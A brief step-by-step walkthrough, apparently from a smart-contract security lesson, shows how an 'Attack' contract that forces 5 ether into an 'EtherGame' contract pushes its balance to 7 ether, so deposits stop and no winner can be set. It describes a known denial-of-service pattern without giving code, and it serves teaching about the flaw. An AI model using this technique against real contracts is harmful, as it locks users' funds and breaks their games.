1. Deploy EtherGame
2. Players (say Alice and Bob) decides to play, deposits 1 Ether each.
2. Deploy Attack with address of EtherGame
3. Call Attack.attack sending 5 ether. This will break the game
   No one can become the winner.

What happened?
Attack forced the balance of EtherGame to equal 7 ether.
Now no one can deposit and the winner cannot be set.
